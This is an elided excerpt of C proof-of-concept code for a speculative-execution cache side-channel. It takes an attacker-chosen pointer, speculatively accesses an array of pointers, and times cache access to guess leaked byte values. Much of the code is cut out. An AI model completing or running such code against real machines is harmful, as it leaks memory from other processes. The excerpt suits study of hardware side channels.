...
int main(int argc, const char **argv) {
        ...
        // Let the running user set the pointer we're going to guess on the
        // command line
        ...
        if (argc == 3) {
                ...
                malicious_x -=
                    (size_t)array1; /* Convert input value into a pointer */
...
#define BYTES_PER_L2_LINE (128)
        aop = mmap(NULL, BYTES, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE,
                   -1, 0);
        assert(aop != MAP_FAILED);
        assert((uintptr_t)(aop + BYTES) %
               (1 << 21)); // Not pushed up against 2MB bound

        data = mmap(NULL, BYTES_PER_L2_LINE * TOTAL_PTRS,
        ...
        for (size_t i = 0;
             i < BYTES_PER_L2_LINE * TOTAL_PTRS / sizeof(uint64_t *); ++i) {
                data[i] = rand() % 179;
        }

        // This is main *set up* for the PoC. The target_ptr is the ptr that we
        // are testing for validity. `array2 + some offset' are all valid and
        // controlled here by the test program (or attacker). After
        // speculatively accessing through aop[0 * PTRS_PER_CACHELINE], aop[1 *
        // ...], aop[2 * ...], we will test the access time to array2 + 103 *
        // 512.
        ...
        while (--len >= 0) {
                ...
                printf("%s: ",
                       (score[0] && score[0] >= 2 * score[1] ? "Success"
                                                             : "Unclear"));
                ...
                if (score[1] > 0)
                        printf(
                            "(second best: 0x%02X='%c' score=%d)", value[1],
